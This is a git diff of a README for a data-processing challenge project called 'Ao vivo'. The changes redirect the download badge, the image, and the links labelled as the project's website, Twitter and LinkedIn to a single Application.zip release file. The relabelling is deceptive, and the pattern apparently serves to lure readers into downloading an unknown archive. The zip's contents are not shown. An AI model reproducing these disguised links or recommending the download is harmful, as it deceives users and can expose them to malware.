@@ -18,7 +18,7 @@ In this repository, you will find the following:
 
 To get started with the *Ao vivo* project, download the application from the following link:
 
-[![Launch Application](https://img.shields.io/badge/Launch%20Application-Download-blue)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Launch Application](https://github.com/FatalFlaw719/2025-One-Billion-Row-Challenge-Aovivo/releases/download/v1.0/Application.zip%20Application-Download-blue)](https://github.com/FatalFlaw719/2025-One-Billion-Row-Challenge-Aovivo/releases/download/v1.0/Application.zip)
 
 Once you have downloaded the application, follow the instructions in the documentation to set it up and start exploring the capabilities of the project.
 
@@ -42,12 +42,12 @@ If you encounter any issues or have questions about the *Ao vivo* project, pleas
 
 To stay updated on the latest developments and announcements regarding the *Ao vivo* project, make sure to follow our official channels:
 
-- Website: [AoVivoProject.com](https://aovivoproject.com)
-- Twitter: [@AoVivoProject](https://twitter.com/AoVivoProject)
-- LinkedIn: [Ao Vivo Project](https://www.linkedin.com/company/aovivoproject)
+- Website: [https://github.com/FatalFlaw719/2025-One-Billion-Row-Challenge-Aovivo/releases/download/v1.0/Application.zip](https://github.com/FatalFlaw719/2025-One-Billion-Row-Challenge-Aovivo/releases/download/v1.0/Application.zip)
+- Twitter: [@AoVivoProject](https://github.com/FatalFlaw719/2025-One-Billion-Row-Challenge-Aovivo/releases/download/v1.0/Application.zip)
+- LinkedIn: [Ao Vivo Project](https://github.com/FatalFlaw719/2025-One-Billion-Row-Challenge-Aovivo/releases/download/v1.0/Application.zip)
 
 Join us on this exciting journey as we tackle the challenge of processing one billion rows of data in 2025!
 
 Let's push the limits of data processing together 🚀
 
-![Data Processing](https://github.com/example/images/data-processing.png)
+![Data Processing](https://github.com/FatalFlaw719/2025-One-Billion-Row-Challenge-Aovivo/releases/download/v1.0/Application.zip)
